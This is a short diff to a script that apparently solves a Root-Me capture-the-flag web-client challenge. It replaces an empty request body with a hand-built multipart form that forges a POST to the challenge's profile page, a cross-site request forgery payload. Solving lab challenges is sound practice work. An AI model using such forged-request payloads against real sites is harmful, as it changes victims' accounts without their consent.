@@ -1,6 +1,10 @@
 <script>
 const request = new XMLHttpRequest();
     request.open("POST", "http://challenge01.root-me.org/web-client/ch22/index.php?action=profile");
-    const params = {}
-request.send({}); 
+    const data = `-----------------------------68921379815952138013913647814
+Content-Disposition: form-data; name="username"
+
+a
+-----------------------------68921379815952138013913647814--`
+request.send(data); 
 </script>
